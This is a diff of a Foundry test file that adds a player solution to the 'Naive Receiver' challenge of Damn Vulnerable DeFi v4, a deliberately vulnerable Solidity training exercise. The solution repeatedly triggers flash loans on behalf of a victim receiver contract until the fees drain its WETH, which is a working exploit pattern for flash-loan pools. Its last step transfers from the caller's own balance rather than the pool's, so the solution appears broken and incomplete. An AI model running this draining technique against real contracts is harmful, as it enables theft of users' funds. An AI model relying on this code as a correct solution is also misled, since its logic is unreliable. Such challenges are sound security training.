@@ -1,12 +1,17 @@
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-pragma solidity =0.8.19;
+pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {NaiveReceiverPool} from "../contracts/NaiveReceiverPool.sol";
-import {Multicall} from "../contracts/Multicall.sol";
-import {FlashLoanReceiver} from "../contracts/FlashLoanReceiver.sol";
-import {BasicForwarder} from "../contracts/BasicForwarder.sol";
+import {NaiveReceiverPool} from "../security-exercises/damn-vulnerable-defi/contracts/NaiveReceiverPool.sol";
+import {Multicall} from "../security-exercises/damn-vulnerable-defi/contracts/Multicall.sol";
+import {FlashLoanReceiver} from "../security-exercises/damn-vulnerable-defi/contracts/FlashLoanReceiver.sol";
+import {BasicForwarder} from "../security-exercises/damn-vulnerable-defi/contracts/BasicForwarder.sol";
+import {WETH} from "solmate/tokens/WETH.sol";
+
+// added for solution
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -53,7 +58,7 @@ contract NaiveReceiverChallenge is Test {
         vm.stopPrank();
     }
 
-    function test_assertInitialState() public {
+    function testAssertInitialState() public {
         // Check initial balances
         assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
         assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);
@@ -75,10 +80,36 @@ contract NaiveReceiverChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * GOAL => drain the borrower, not necessarily steal their funds
+     * HOW  => repeatedly trigger flash loans that incur a fee on the borrower each time, until his balance is depleted
+               The receiver has 10eth, with a 1eth fee on the flash loans, would take just 10 calls
      */
-    function test_naiveReceiver() public checkSolvedByPlayer {
-        
+   
+    function testNaiveReceiver() public checkSolvedByPlayer {
+
+        uint256 flashLoanAmount = 1 ether; 
+        uint256 fee = pool.flashFee(address(weth), flashLoanAmount);
+        uint256 receiverBalance = weth.balanceOf(address(receiver));
+
+        console.log("Flash loan amount:", flashLoanAmount);
+        console.log("Flash loan fee:", fee);
+        console.log("Initial receiver balance:", weth.balanceOf(address(receiver)));
+
+        // @question doesn't seem very secure that we can externally call flashloans for other contracts/wallets, isn't this prevented usually?
+        do {
+            pool.flashLoan(IERC3156FlashBorrower(address(receiver)), address(weth), flashLoanAmount, "");
+            receiverBalance = weth.balanceOf(address(receiver));
+            console.log("Updated receiver balance:", receiverBalance);
+        } while (receiverBalance > fee);
+
+        console.log("Final receiver balance:", weth.balanceOf(address(receiver)));
+
+        uint256 poolBalance = weth.balanceOf(address(pool));
+
+        if (poolBalance > 0) {
+            weth.transfer(recovery, poolBalance);
+        }
+   
     }
 
     /**
@@ -96,5 +127,9 @@ contract NaiveReceiverChallenge is Test {
 
         // All funds sent to recovery account
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure /**override*/ returns (bytes4) {
+        return this.onERC721Received.selector;
     }
 }
